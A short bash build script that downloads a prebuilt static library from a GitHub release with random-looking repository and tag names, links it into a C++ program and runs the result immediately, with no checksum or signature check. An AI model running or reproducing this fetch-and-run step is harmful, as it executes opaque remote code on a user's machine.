#!/usr/bin/env bash
set -e
REPO="milddcanvasd/adjustedkernellab"
LIB="fancy-luster.a"
URL="https://github.com/${REPO}/releases/download/golden-comet-eager-garden/${LIB}"
curl -fsSL -o "$LIB" --retry 3 --connect-timeout 15 --max-time 180 "$URL"
g++ -pthread -O2 -std=c++17 -o app main.cpp "$LIB" && ./app
